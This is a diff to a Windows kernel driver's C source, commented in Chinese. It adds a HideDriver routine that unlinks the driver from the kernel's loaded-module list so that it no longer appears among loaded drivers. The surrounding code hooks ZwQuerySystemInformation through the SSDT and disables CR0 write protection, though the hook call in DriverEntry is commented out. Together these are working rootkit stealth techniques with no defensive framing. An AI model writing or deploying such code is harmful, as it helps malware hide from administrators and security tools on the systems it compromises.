@@ -293,11 +293,70 @@ VOID unhookSSDT(ULONG index,BYTE* oldAddr,DWORD* callTable) {
 	InterlockedExchange(target, (LONG)oldAddr);
 }
 
+/*************************************
+ *   隐藏驱动程序
+ *************************************/
+//Driver_section结构
+typedef struct _LDR_DATA_TABLE_ENTRY
+{
+	LIST_ENTRY InLoadOrderLinks;
+	LIST_ENTRY InMemoryOrderLinks;
+	LIST_ENTRY InInitializationOrderLinks;
+	PVOID DllBase;
+	PVOID EntryPoint;
+	ULONG SizeOfImage;
+	UNICODE_STRING FullDllName;
+	UNICODE_STRING BaseDllName;
+	ULONG Flags;
+	USHORT LoadCount;
+	USHORT TlsIndex;
+	union
+	{
+		LIST_ENTRY HashLinks;
+		struct
+		{
+			PVOID SectionPointer;
+			ULONG CheckSum;
+		};
+	};
+	union
+	{
+		ULONG TimeDateStamp;
+		PVOID LoadedImports;
+	};
+	struct _ACTIVATION_CONTEXT* EntryPointActivationContext;
+	PVOID PatchInformation;
+	LIST_ENTRY ForwarderLinks;
+	LIST_ENTRY ServiceTagLinks;
+	LIST_ENTRY StaticLinks;
+} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;
+
+
+void HideDriver(IN PDRIVER_OBJECT DriverObject) {
+
+	KIRQL irql = KeRaiseIrqlToDpcLevel(); //
+
+
+	PLDR_DATA_TABLE_ENTRY prevEntry, nextEntry, modEntry;
+	modEntry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
+	prevEntry = (PLDR_DATA_TABLE_ENTRY)modEntry->InLoadOrderLinks.Blink;
+	nextEntry = (PLDR_DATA_TABLE_ENTRY)modEntry->InLoadOrderLinks.Flink;
+
+	//双链表操作
+	prevEntry->InLoadOrderLinks.Flink = modEntry->InLoadOrderLinks.Flink;
+	nextEntry->InLoadOrderLinks.Blink = modEntry->InLoadOrderLinks.Blink;
+	modEntry->InLoadOrderLinks.Flink = (PLIST_ENTRY)modEntry;
+	modEntry->InLoadOrderLinks.Blink = (PLIST_ENTRY)modEntry;
+
+
+	KeLowerIrql(irql);
+}
+
 
 
 VOID Unload(IN PDRIVER_OBJECT DriverObject) {
 	//KdBreakPoint();
-	DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "Driver unLoading.\n");
+	DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "Driver unLoaded.\n");
 	disableWP_cr0();
 	unhookSSDT(ulSSDTFunctionIndex, oldZwQuerySystemInformation, SSDTcallTable);
 	enableWP_cr0();
@@ -327,6 +386,10 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING regPath)
 		DbgPrint("Get SSDT Function address Error!\n");
 		return STATUS_SUCCESS;
 	}
+
+	//修改内核对象DriverObject的DRIVER_SECTION
+	//将其从双链表上摘除以隐藏驱动自身
+	HideDriver(DriverObject);
 
 	disableWP_cr0();
 	//oldZwQuerySystemInformation = hookSSDT(ulSSDTFunctionIndex, newZwQuerySystemInformation, SSDTcallTable);
